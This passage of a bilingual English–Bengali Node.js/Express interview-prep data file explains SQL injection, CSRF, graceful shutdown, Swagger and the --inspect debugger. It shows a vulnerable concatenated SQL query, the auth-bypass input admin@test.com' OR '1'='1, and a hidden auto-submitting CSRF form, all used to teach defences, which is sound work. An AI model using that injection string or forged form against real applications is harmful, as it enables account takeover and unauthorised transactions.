### Code Example
\`\`\`javascript
// Conceptual database driver setup
const mysql = require('mysql2/promise');

async function loginUser(pool, email, password) {
  // 1. VULNERABLE (Avoid)
  // const badQuery = \`SELECT * FROM users WHERE email = '\${email}' AND password = '\${password}'\`;
  // const [rows] = await pool.query(badQuery);

  // 2. SECURE (Prepared Statement with Parameter Placeholders)
  const secureQuery = 'SELECT * FROM users WHERE email = ? AND password = ?';
  const [rows] = await pool.query(secureQuery, [email, password]); // Passed safely inside array
  
  return rows;
}
console.log("SQL Injection prevention method configured.");
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
SQL ইনজেকশন হ্যাকারদের অথেনটিকেশন বাইপাস করতে, ডাটাবেসের গোপন টেবিল দেখতে বা সম্পূর্ণ ডাটাবেস মুছে দেওয়ার সুযোগ দেয়:
১. **স্ট্রিং জোড়াতালির ঝুঁকি**:
   - ঝুঁকিপূর্ণ কোড: \`"SELECT * FROM users WHERE email = '" + email + "'"\`।
   - হ্যাকার যদি ইনপুটে \`admin@test.com' OR '1'='1\` লেখে, ডাটাবেস সম্পূর্ণ কুয়েরি এক্সিকিউট করে প্রথম রো-এর সব ইউজারের ডাটা দিয়ে দিবে কারণ \`'1'='1'\` শর্তটি সর্বদা সত্য।
২. **প্রিপেয়ার্ড স্টেটমেন্ট (Prepared Statements)**: কুয়েরি পাথে ভ্যারিয়েবলের পরিবর্তে প্লেসহোল্ডার (\`?\` বা \`$1\`) ব্যবহার করা হয়। ডাটাবেস ইঞ্জিন প্রথমে মূল কুয়েরির লজিক কম্পাইল করে নেয় এবং পরবর্তীতে ইনপুট ডাটা যোগ করে। ইনপুটে এসকিউএল কোড থাকলেও তা সাধারণ টেক্সট হিসেবে পরিগণিত হয়।

### বাস্তব-ভিত্তিক উদাহরণ
আধুনিক এসকিউএল ড্রাইভারগুলো (যেমন: \`mysql2\` বা \`pg\`) প্যারামিটারগুলো আলাদা অ্যারে আকারে নেয়:
\`\`\`javascript
db.query('SELECT * FROM users WHERE email = ?', [req.body.email]);
\`\`\`

### উত্তম অনুশীলন
ইউজারের ডাটা সহ সরাসরি কোয়েরি স্ট্রিং বা টেমপ্লেট লিটারেল (\` \` \`) দিয়ে ডাটাবেস কুয়েরি করা বন্ধ করুন। ডাটাবেস হ্যান্ডেল করার জন্য প্রিজমা (Prisma) বা সিকুয়ালাইজ (Sequelize) এর মতো আধুনিক ORM ব্যবহার করুন।

### সাধারণ ভুলসমূহ
মনে করা যে ডাটাবেস লোকাল সার্ভারে থাকায় হ্যাক হওয়ার সুযোগ নেই। যেকোনো পাবলিক ইনপুট ফর্ম থেকেই এসকিউএল ইনজেকশন অ্যাটাক চালানো সম্ভব।

### Code Example
\`\`\`javascript
const mysql = require('mysql2/promise');

async function loginUser(pool, email, password) {
  // ১. ঝুঁকিপূর্ণ কোড (পরিহার করুন)
  // const badQuery = \`SELECT * FROM users WHERE email = '\${email}' AND password = '\${password}'\`;
  // const [rows] = await pool.query(badQuery);

  // ২. সুরক্ষিত কোড (প্লেসহোল্ডার ও প্যারামিটার ব্যবহার করা হয়েছে)
  const secureQuery = 'SELECT * FROM users WHERE email = ? AND password = ?';
  const [rows] = await pool.query(secureQuery, [email, password]); // নিরাপদ অ্যারে ডাটা
  
  return rows;
}
console.log("এসকিউএল ইনজেকশন প্রতিরোধ পদ্ধতি কনফিগার করা হয়েছে।");
\`\`\``
  },
  {
    id: 'node-express-67',
    title: 'What is CSRF (Cross-Site Request Forgery) and how do you protect against it in Express?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Security', 'CSRF', 'Cookies'],
    enAnswer: 'CSRF forces an authenticated user browser to execute unwanted actions on a web application. In Express, protect against CSRF by configuring SameSite: "Lax" or "Strict" cookie settings, and validating CSRF tokens (using csurf middleware or custom validation tokens) on write requests (POST/PUT/DELETE).',
    bnAnswer: 'CSRF (Cross-Site Request Forgery) কোনো অথেনটিকেটেড ব্যবহারকারীর ব্রাউজারকে বাধ্য করে তার অনুমতি ছাড়াই ব্যাকএন্ডে ক্ষতিকারক রিকোয়েস্ট পাঠাতে। এক্সপ্রেসে এটি প্রতিরোধে SameSite: "Lax" কুকি সেটিং ব্যবহার করা হয় এবং সিএসআরএফ (CSRF) টোকেন যাচাই করা হয়।',
    enExplanation: `### Explanation
How a CSRF attack occurs and how it is blocked:
1. **The Vulnerability**: When a user logs in, the browser stores their auth cookie. If the cookie lacks strict configurations, the browser automatically attaches it to *every* request sent to your API, even if the request is initiated from a malicious website in another browser tab.
2. **The Attack**: A hacker creates a site with a hidden form: \`<form action="https://bank.com/transfer" method="POST">\`. When the victim visits, JavaScript auto-submits this form, transferring money because the victim's browser includes their valid login cookie automatically.
3. **Protection**:
   - **SameSite Cookies**: Setting \`SameSite: 'Lax'\` or \`SameSite: 'Strict'\` ensures the browser *blocks* sending cookies on cross-origin POST requests, blocking CSRF.
   - **CSRF Tokens**: The server generates a unique token for the user session. The frontend includes this token in a custom HTTP header or hidden form input for write requests, and the server validates it before processing.

### Real-World Example
Without CSRF protection, visiting a compromised forum can trigger a background request to \`https://devprep.io/api/delete-profile\`. If you are logged into DevPrep in another tab, your browser submits the cookie, and your profile is deleted. SameSite cookie configuration prevents this automatically.

### Best Practice
Always configure your authentication cookies with \`httpOnly: true\`, \`secure: true\`, and \`sameSite: 'lax'\` or \`sameSite: 'strict'\`. For APIs consumed by Single Page Applications, validate custom headers (like \`X-Requested-With\` or a dedicated CSRF token) on all write requests (POST, PUT, DELETE).

### Common Mistakes
Relying entirely on JWT stored in standard local cookies without configuring SameSite protections. If you store JWT in cookies, they are still vulnerable to CSRF unless SameSite options are set.

### Code Example
\`\`\`javascript
const express = require('express');
const session = require('express-session');
const app = express();

// Secure session configuration with SameSite cookie protection
app.use(session({
  secret: 'devprep-csrf-key',
  resave: false,
  saveUninitialized: true,
  cookie: {
    httpOnly: true, // Prevents XSS script read
    secure: false, // Set to true in production over HTTPS
    sameSite: 'lax' // Prevents cross-origin browser auto-attachment (blocks CSRF)
  }
}));

app.post('/api/transfer-funds', (req, res) => {
  res.json({ status: 'Transfer successful' });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
CSRF (Cross-Site Request Forgery) অ্যাটাকের রূপরেখা ও সুরক্ষা:
১. **ঝুঁকি**: ইউজার লগইন করার পর ব্রাউজারে অথেনটিকেশন কুকি সেভ থাকে। কুকিতে সেফ গার্ড না থাকলে ব্রাউজার ওই সাইটে যেকোনো রিকোয়েস্ট হিটের সাথে কুকিটি পাঠিয়ে দেয়, রিকোয়েস্টটি অন্য কোনো ক্ষতিকর সাইট থেকে আসলেও।
২. **অ্যাটাক সিনারিও**: হ্যাকার তার সাইটে একটি ফর্ম লুকায়: \`<form action="https://bank.com/transfer" method="POST">\`। ইউজার ওই লিংকে ক্লিক করলেই ব্রাউজার অটোমেটিক তার ব্যাংক লগইন কুকি সাথে নিয়ে সাবমিট করে দেয় ও হ্যাকারের একাউন্টে টাকা চলে যায়।
৩. **সুরক্ষা পদ্ধতি**:
   - **SameSite Cookies**: কুকি সেটিংসে \`SameSite: 'Lax'\` বা \`SameSite: 'Strict'\` ব্যবহার করলে অন্য সাইট থেকে হওয়া রিকোয়েস্টে ব্রাউজার কুকি ব্লক করে দেয়।
   - **CSRF টোকেন**: সার্ভার ইউজারকে একটি ওয়ান-টাইম সিকিউরিটি টোকেন পাঠায়। ফ্রন্টএন্ড প্রতিটি পোস্ট রিকোয়েস্টের বডিতে বা হেডারে এই টোকেনটি ফেরত পাঠায় যা ডাটাবেসে সেভ থাকা টোকেনের সাথে মেলানো হয়।

### বাস্তব-ভিত্তিক উদাহরণ
ডিভপ্রিপ সাইটে লগইন থাকা অবস্থায় অন্য একটি ক্ষতিকর সাইটে ক্লিক করার পর যদি ওই সাইট ব্যাকগ্রাউন্ডে \`/api/delete-profile\` কল করে, তবে কুকি প্রোটেকশন না থাকলে আপনার অ্যাকাউন্ট মুছে যাবে। SameSite কনফিগারেশন থাকলে ব্রাউজার কুকি অ্যাটাচ করবে না।

### উত্তম অনুশীলন
অথেনটিকেশন কুকি সেটিংসে সর্বদা \`httpOnly: true\`, \`secure: true\` এবং \`sameSite: 'lax'\` ব্যবহার করুন। স্পা (SPA) ফ্রন্টএন্ড প্রজেক্টে রিকোয়েস্ট হেডার হিসেবে কাস্টম সিকিউরিটি টোকেন ডিল করুন।

### সাধারণ ভুলসমূহ
JWT টোকেন কুকিতে সেভ করে রাখা কিন্তু SameSite রুলস কনফিগার না করা। টোকেন কুকিতে থাকলে তা সিএসআরএফ (CSRF) অ্যাটাকের আওতায় পড়তে পারে যদি না SameSite 'Lax' বা 'Strict' করা থাকে।

### Code Example
\`\`\`javascript
const express = require('express');
const session = require('express-session');
const app = express();

app.use(session({
  secret: 'devprep-csrf-key',
  resave: false,
  saveUninitialized: true,
  cookie: {
    httpOnly: true, 
    secure: false, // প্রোডাকশনে ট্রু করতে হবে
    sameSite: 'lax' // অন্য ডোমেইন থেকে ব্রাউজারের কুকি পাঠানো ব্লক করে (CSRF প্রতিরোধ)
  }
}));

app.post('/api/transfer-funds', (req, res) => {
  res.json({ status: 'টাকা পাঠানো সম্পন্ন হয়েছে' });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-68',
    title: 'Explain Graceful Shutdown in Node.js applications.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'DevOps', 'Process Management', 'Best Practice'],
    enAnswer: 'Graceful shutdown is the practice of shutting down a Node.js server cleanly when receiving exit signals (like SIGTERM/SIGINT). It involves stopping the HTTP server from accepting new connections, completing active requests, closing database connections, and exiting.',
    bnAnswer: 'গ্রেটফুল শাটডাউন (Graceful Shutdown) হলো ওএস থেকে এক্সিট সিগন্যাল (যেমন: SIGTERM/SIGINT) পাওয়ার পর নোডজেএস সার্ভারকে পরিচ্ছন্নভাবে বন্ধ করা। এটি নতুন রিকোয়েস্ট নেওয়া বন্ধ করে, চলমান রিকোয়েস্ট শেষ করে, ডাটাবেস কানেকশন ক্লোজ করে প্রসেসটি বন্ধ করে দেয়।',
    enExplanation: `### Explanation
When deploying updates, servers are constantly stopped and restarted.
Steps for a Graceful Shutdown:
1. **Listen for OS Signals**: Capture process signals using event listeners:
   - \`SIGTERM\`: Triggered by cloud platforms (e.g. AWS, Kubernetes, PM2) requesting shutdown.
   - \`SIGINT\`: Triggered by pressing \`Ctrl+C\` in the terminal.
2. **Stop Accepting Connections**: Call \`server.close()\`. This stops the HTTP server from accepting new requests but keeps connections open for active requests.
3. **Complete Active Requests**: Let currently executing requests finish their response pipelines.
4. **Close Core Resources**: Disconnect from databases, message queues, and cache stores.
5. **Exit Process**: Call \`process.exit(0)\` (successful termination).

### Real-World Example
If an update is pushed while a user is downloading a heavy PDF file, a brute-force server crash cuts the download immediately. A graceful shutdown lets the PDF download finish before shutting down the container.

### Best Practice
Set a timeout buffer (e.g. 10 to 30 seconds) during shutdown. If resource cleanups take too long, force exit the process to prevent the server from hanging indefinitely.

### Common Mistakes
Calling \`process.exit(0)\` immediately upon receiving a \`SIGTERM\` signal, which instantly aborts all active client database writes and causes database corruption.

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

const server = app.listen(3000);

// Listen for SIGTERM (signal sent by PM2 or Docker)
process.on('SIGTERM', () => {
  console.log('SIGTERM signal received. Commencing graceful shutdown...');
  
  // 1. Stop HTTP server
  server.close(() => {
    console.log('HTTP server closed. No longer accepting requests.');
    
    // 2. Close database connections (Mock)
    console.log('Database connections closed safely.');
    
    // 3. Exit process cleanly
    process.exit(0);
  });

  // Force exit after 10 seconds if connections hang
  setTimeout(() => {
    console.error('Forced shutdown due to timeout!');
    process.exit(1);
  }, 10000);
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
প্রোডাকশনে আপডেট ডেপ্লয় করার সময় ওল্ড কন্টেইনার স্টপ করে নতুন কন্টেইনার স্টার্ট করা হয়।
ধাপসমূহ:
১. **ওএস সিগন্যাল মনিটর করা**: প্রসেস ইভেন্ট ক্যাচ করা:
   - \`SIGTERM\`: ক্লাউড প্ল্যাটফর্ম (AWS, PM2) দ্বারা পাঠানো শাটডাউন রিকোয়েস্ট।
   - \`SIGINT\`: টার্মিনালে \`Ctrl+C\` প্রেস করা হলে ট্র্রিগার হয়।
২. **নতুন রিকোয়েস্ট বন্ধ করা**: \`server.close()\` কল করা। এটি নতুন রিকোয়েস্ট নেওয়া বন্ধ করে কিন্তু পূর্বে কানেক্ট হওয়া সেশনগুলো সচল রাখে।
৩. **চলমান কাজ শেষ করা**: চলমান কুয়েরি বা ফাইল ডাউনলোডগুলোকে তাদের কাজ শেষ করার সুযোগ দেওয়া।
৪. **ডাটাবেস কানেকশন বন্ধ করা**: ডাটাবেস ও রেডিস সকেট ক্লোজ করা।
৫. **প্রসেস থেকে বের হওয়া**: \`process.exit(0)\` কল করা (সাফল্য নির্দেশক কোড)।

### বাস্তব-ভিত্তিক উদাহরণ
ইউজার বড় ফাইল ডাউনলোড করছেন এমন সময় সার্ভারে আপডেট পুশ করা হলো। সার্ভার হুট করে রিস্টার্ট দিলে ইউজারের ডাউনলোড ব্যর্থ হবে। গ্রেটফুল শাটডাউন ফাইল ডাউনলোড সম্পন্ন হওয়া পর্যন্ত অপেক্ষা করে তারপর সার্ভার রিস্টার্ট দেয়।

### উত্তম অনুশীলন
শাটডাউন প্রসেসে একটি টাইমআউট বাফার টাইম (যেমন ১০ সেকেন্ড) রাখুন। রিসোর্স রিলিজ করতে অতিরিক্ত সময় লাগলে জ্যাম এড়াতে \`process.exit(1)\` দিয়ে জোরপূর্বক প্রসেস বন্ধ করে দিন।

### সাধারণ ভুলসমূহ
\`SIGTERM\` সিগন্যাল পাওয়ার সাথে সাথেই কোনো কিছু চেক না করে সরাসরি \`process.exit(0)\` কল করে বসা, যার ফলে মাঝপথে থাকা ডাটাবেস রাইট কুয়েরি ফেইল করে ডাটা লস হয়।

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

const server = app.listen(3000);

// SIGTERM সিগন্যাল লিসেনার (পিএম২ বা ডকার পাঠায়)
process.on('SIGTERM', () => {
  console.log('SIGTERM সিগন্যাল পাওয়া গেছে। শাটডাউন শুরু হচ্ছে...');
  
  // ১. এইচটিটিপি সার্ভার ক্লোজ করা
  server.close(() => {
    console.log('এইচটিটিপি সার্ভার বন্ধ হয়েছে। নতুন রিকোয়েস্ট আর নেওয়া হবে না।');
    
    // ২. ডাটাবেস কানেকশন ক্লোজ করা (Mock)
    console.log('ডাটাবেস কানেকশন সুরক্ষিতভাবে বন্ধ করা হয়েছে।');
    
    // ৩. প্রসেস বন্ধ করা
    process.exit(0);
  });

  // ১০ সেকেন্ডের মধ্যে প্রসেস বন্ধ না হলে ফোর্স এক্সিট
  setTimeout(() => {
    console.error('বাধ্যতামূলক শাটডাউন করা হলো!');
    process.exit(1);
  }, 10000);
});
\`\`\``
  },
  {
    id: 'node-express-69',
    title: 'Explain Swagger / OpenAPI documentation integration in Express.js.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Swagger', 'OpenAPI', 'API Documentation'],
    enAnswer: 'Swagger/OpenAPI is used to document REST APIs. In Express, this is integrated using swagger-jsdoc (which parses JSDoc comments into OpenAPI specifications) and swagger-ui-express (which hosts an interactive web dashboard rendering these specs).',
    bnAnswer: 'Swagger/OpenAPI ব্যবহার করা হয় REST API সমূহের ইন্টারেক্টিভ ডকুমেন্টেশন তৈরি করতে। এক্সপ্রেসে এটি swagger-jsdoc (যা জেএসডক কমেন্ট থেকে ওপেনএপিআই স্কিমা তৈরি করে) এবং swagger-ui-express (যা ওয়েব ড্যাশবোর্ডে এটি প্রদর্শন করে) দিয়ে যুক্ত করা হয়।',
    enExplanation: `### Explanation
How API documentation is automated:
1. **OpenAPI Specification**: A standard format to describe REST APIs (parameters, paths, response schemas).
2. **JSDoc tags**: Instead of writing separate huge JSON schemas, developers write code documentation in comments above route handlers using YAML syntax.
3. **\`swagger-jsdoc\`**: Parses these JSDoc comments to generate the OpenAPI JSON file.
4. **\`swagger-ui-express\`**: Serves an interactive endpoint (usually \`/api-docs\`) showing endpoints, schemas, authentication options, and a "Try it out" console.

This eliminates document-sync issues when routes change.

### Real-World Example
A frontend developer needs to call a new \`/users/:id/reset\` endpoint. Instead of asking backend developers what body fields are required, they visit \`http://localhost:3000/api-docs\` to inspect the parameters, verify response types, and test the endpoint directly.

### Best Practice
Keep Swagger specs synchronized with code changes. Place schema definitions inside separate YAML/JSON declaration files to prevent JSDoc comments from cluttering router files.

### Common Mistakes
Forgetting to secure the documentation endpoint in production environments. Hide or restrict the \`/api-docs\` route in live production server instances to prevent malicious actors from mapping your internal API surfaces.

### Code Example
\`\`\`javascript
const express = require('express');
const swaggerUi = require('swagger-ui-express');
const app = express();

// Mock Swagger Specs JSON configuration
const swaggerDocument = {
  openapi: '3.0.0',
  info: {
    title: 'DevPrep API',
    version: '1.0.0',
    description: 'Bilingual Node.js and Express.js API Documentation'
  },
  paths: {
    '/api/status': {
      get: {
        responses: {
          200: { description: 'Success' }
        }
      }
    }
  }
};

// Expose Swagger UI dashboard endpoint
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument));

app.get('/api/status', (req, res) => res.json({ status: 'OK' }));

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
এপিআই ডকুমেন্টেশন অটোমেট করার উপায়:
১. **OpenAPI Specification**: এটি এপিআই-এর পাথ, ইনপুট টাইপ, প্যারামিটার ও আউটপুট ডাটা ফরম্যাট ডিক্লেয়ার করার স্ট্যান্ডার্ড বা মানদণ্ড।
২. **JSDoc ট্যাগ**: এক্সপ্রেসে রাউট ফাইলের ওপরে কমেন্টের ভেতর ইয়ামল (YAML) সিনট্যাক্স দিয়ে এই রুলস ডিফাইন করা হয়।
৩. **\`swagger-jsdoc\`**: এই প্যাকেজটি কোডের কমেন্টগুলো রিড করে একটি ওপেনএপিআই জেএসন (OpenAPI JSON) ফাইল জেনারেট করে।
৪. **\`swagger-ui-express\`**: এটি একটি ওয়েব ড্যাশবোর্ড বা রাউট (\`/api-docs\`) প্রদান করে যেখানে এপিআই এন্ডপয়েন্টগুলো ট্রাই করে দেখার বা টেস্ট করার সরাসরি বাটন থাকে।

### বাস্তব-ভিত্তিক উদাহরণ
ফ্রন্টএন্ড ডেভেলপারের একটি নতুন এপিআই কল করার প্রয়োজন পড়ল। সে ব্যাকএন্ড টিমকে জিজ্ঞাসা না করে সরাসরি \`/api-docs\` লিংকে ক্লিক করে রিকোয়েস্টে কোন কোন ফিল্ড পাঠাতে হবে এবং আউটপুট কেমন আসবে তা নিজেই দেখে টেস্ট করতে পারবে।

### উত্তম অনুশীলন
কোড চেঞ্জ করার সাথে সাথে সোয়াগার স্কিমাও আপডেট রাখুন। বড় এপিআই পাথের বিবরণ দিয়ে কোড ফাইল নোংরা না করতে ডাটা টাইপ অবজেক্টগুলো আলাদা ফাইলে লিখে সোয়াগার স্কিমার ভেতর রেফারেন্স হিসেবে যুক্ত করুন।

### সাধারণ ভুলসমূহ
লাইভ প্রোডাকশন সার্ভারেও \`/api-docs\` সবার জন্য ওপেন রাখা। এর ফলে হ্যাকাররা সার্ভারের সব এপিআই পাথের নিখুঁত ম্যাপ পেয়ে যায়। প্রোডাকশনে আইপি চেক বা পাসওয়ার্ড দিয়ে এই রাউট লক করে রাখা উচিত।

### Code Example
\`\`\`javascript
const express = require('express');
const swaggerUi = require('swagger-ui-express');
const app = express();

// সোয়াগার স্কিমা কনফিগারেশন
const swaggerDocument = {
  openapi: '3.0.0',
  info: {
    title: 'DevPrep API',
    version: '1.0.0',
    description: 'নোডজেএস ও এক্সপ্রেসজেএস এপিআই ডকুমেন্টেশন'
  },
  paths: {
    '/api/status': {
      get: {
        responses: {
          200: { description: 'সফলভাবে সম্পন্ন হয়েছে' }
        }
      }
    }
  }
};

// সোয়াগার ড্যাশবোর্ড এন্ডপয়েন্ট মাউন্ট করা
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument));

app.get('/api/status', (req, res) => res.json({ status: 'OK' }));

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-70',
    title: 'How do you debug Node.js applications using Chrome DevTools with the --inspect flag?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Debugging', 'Chrome DevTools', 'Troubleshooting'],
    enAnswer: 'To debug, start the Node.js process using node --inspect app.js. Node opens a WebSocket inspector port (default 9229). Navigate to chrome://inspect in Google Chrome and click "Open dedicated DevTools for Node" to set breakpoints, inspect variables, and profile CPU execution.',
    bnAnswer: 'ডিবাগ করতে node --inspect app.js দিয়ে নোড প্রসেস চালু করতে হয়। নোডজেএস ৯২২৯ পোর্টে একটি ইন্সপেক্টর সকেট ওপেন করে। এরপর গুগল ক্রোমে chrome://inspect লিংকে গিয়ে ওপেন ডেডিকেটেড দেবটুলস ক্লিক করে ব্রেকপয়েন্ট সেট ও ভ্যারিয়েবল ট্র্যাকিং করা যায়।',
    enExplanation: `### Explanation
Debugging Node.js with Chrome DevTools:
1. **Activation**: Run \`node --inspect server.js\`. If you want to pause execution at the very first line of code, run \`node --inspect-brk server.js\`.
2. **WebSocket Agent**: Node.js starts a debugging agent that exposes the V8 engine internals over a secure WebSockets port.
3. **Chrome Inspector**: Chrome connects to this local port and renders the familiar DevTools interface.
4. **Key Features**:
   - **Breakpoints**: Pause code execution on specific lines to inspect variable states and call stack histories.
   - **Step Over/Into**: Trace execution line-by-line.
   - **Profiler**: Record CPU performance and memory heap allocation.

### Real-World Example
If your server hits a rare memory crash on production configurations, running a local mock server with the \`--inspect\` flag allows you to pause the loop, track object reference assignments, and inspect V8 heap allocations in real-time.

### Best Practice
Never expose the \`--inspect\` port publicly in production environments (\`node --inspect=0.0.0.0:9229\`), as this allows anyone to run arbitrary JavaScript code on your host server. Keep inspection bound to \`localhost\` (\`127.0.0.1\`) and access it using secure SSH tunnels if remote debugging is required.

### Common Mistakes
Using only \`console.log()\` to trace complex object mutation bugs instead of using a proper debugger, which is much slower and pollutes the code with debug logs.

### Code Example
\`\`\`bash
# Start Node app in debug mode, pausing before executing the first line
node --inspect-brk server.js

# In Google Chrome, navigate to:
# chrome://inspect
# Click 'Configure...' and ensure 'localhost:9229' is listed.
# Click 'Open dedicated DevTools for Node' to start debugging.
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
ক্রোম দেবটুলস দিয়ে নোডজেএস ডিবাগ করার ধাপসমূহ:
১. **সক্রিয় করা**: টার্মিনালে রান করুন: \`node --inspect server.js\`। প্রথম লাইনেই কোড থামিয়ে রাখতে চাইলে রান করুন: \`node --inspect-brk server.js\`।
২. **সকেট এজেন্ট**: নোডজেএস একটি ইন্টারনাল সকেট ইন্সপেক্টর চালু করে যা ৯২২৯ পোর্টে ভি৮ ইঞ্জিনের ইনফরমেশন এক্সপোজ করে।
৩. **ক্রোম কানেকশন**: গুগল ক্রোমে গিয়ে ইউজার ইন্টারফেস কানেক্ট করার মাধ্যমে কোড সোর্স লোড করা হয়।
৪. **মূল সুবিধাসমূহ**:
   - **ব্রেকপয়েন্ট**: কোড রানিং অবস্থায় যেকোনো লাইনে ব্রেক দিয়ে পজ বা থমকে দেওয়া যায় ভ্যারিয়েবল ও মেমোরি স্টেট রিড করতে।
   - **স্টেপ ওভার**: কোড লাইন-বাই-লাইন কীভাবে রান হচ্ছে তা এক ধাপ করে চালানো।
   - **প্রোফাইলার**: সিপিইউ পারফরম্যান্স ও মেমোরি ব্যবহারের গ্রাফ দেখা।

### বাস্তব-ভিত্তিক উদাহরণ
কোডের কোনো জটিল ক্যালকুলেশন লুপে এরর আসছে কিন্তু কনসোল লগ দিয়ে ট্র্যাক করা যাচ্ছে না। \`--inspect\` ব্যবহার করে আপনি সরাসরি ক্রোমে কোড ফাইলটি ওপেন করে ব্রেকপয়েন্ট বসিয়ে লাইভ ভ্যারিয়েবল চেক করতে পারবেন।

### উত্তম অনুশীলন
প্রোডাকশন সার্ভারে কখনো গ্লোবাল আইপি দিয়ে ইন্সপেক্টর ওপেন রাখবেন না (\`0.0.0.0:9229\`)। এতে হ্যাকাররা আপনার সার্ভারে যেকোনো কাস্টম স্ক্রিপ্ট বা কমান্ড ফায়ার করার পূর্ণ ক্ষমতা পেয়ে যাবে। এটি সর্বদা সিকিউরড লোকাল হোস্ট আইপি-তে সীমাবদ্ধ রাখুন।

### সাধারণ ভুলসমূহ
কোডের ভুল ডায়াগনোসিস করার জন্য অনবরত ডজন ডজন \`console.log()\` লিখে কোড নষ্ট করা। ব্রেকপয়েন্ট ডিবাগার ব্যবহার করা অনেক বেশি দক্ষ ও প্রফেশনাল পদ্ধতি।

### Code Example
\`\`\`bash
# প্রথম লাইনেই প্রসেস স্থগিত করে ডিবাগ মোডে রান করা
node --inspect-brk server.js

# গুগল ক্রোমে গিয়ে ব্রাউজ করুন:
# chrome://inspect
# 'Configure...' এ ক্লিক করে নিশ্চিত করুন 'localhost:9229' যোগ করা আছে।
# এরপর 'Open dedicated DevTools for Node' এ ক্লিক করে ডিবাগিং উইন্ডো লোড করুন।
\`\`\``
  }
];
